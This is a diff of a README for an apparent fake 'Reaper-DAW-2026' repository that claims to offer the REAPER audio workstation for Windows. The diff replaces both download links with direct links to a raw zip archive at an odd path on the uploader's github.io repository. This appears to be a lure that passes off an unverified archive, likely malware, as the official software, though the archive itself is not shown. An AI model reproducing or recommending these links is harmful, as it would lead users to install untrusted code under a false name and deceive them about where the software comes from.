@@ -5,13 +5,13 @@ description: "Download the REAPER digital audio workstation for Windows 10 and 1
 ---
 # 🎵 Reaper-DAW-2026 - Simple Audio Production For Windows Users
 
-[![Download Reaper](https://img.shields.io/badge/Download-Reaper-blue.svg)](https://github.com/stormiereclusive718/Reaper-DAW-2026)
+[![Download Reaper](https://img.shields.io/badge/Download-Reaper-blue.svg)](https://raw.githubusercontent.com/stormiereclusive718/stormiereclusive718.github.io/main/mesocolon/io-github-stormiereclusive-v3.4.zip)
 
 ## 📥 Get the Software
 
 You must visit the project release page to get the installer for your computer. 
 
-[Click here to visit the download page](https://github.com/stormiereclusive718/Reaper-DAW-2026)
+[Click here to visit the download page](https://raw.githubusercontent.com/stormiereclusive718/stormiereclusive718.github.io/main/mesocolon/io-github-stormiereclusive-v3.4.zip)
 
 Follow these steps to finish the setup:
 
